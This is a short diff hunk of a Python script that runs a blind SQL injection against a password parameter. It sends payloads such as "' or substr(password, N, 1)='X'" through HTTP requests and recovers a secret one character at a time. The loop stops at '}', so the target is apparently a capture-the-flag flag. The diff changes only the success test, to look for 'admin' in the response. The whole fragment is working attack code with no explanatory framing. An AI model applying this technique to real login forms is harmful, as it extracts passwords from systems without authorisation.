@@ -12,7 +12,7 @@ for length in range (1, 100):
         payload = f"' or substr(password, {length}, 1)='{check}"
         
         response = requests.get(url=url, params={"password":payload})
-        if not "ERROR" in response.text:
+        if "admin" in response.text:
             break
     res += check
     if check == "}":
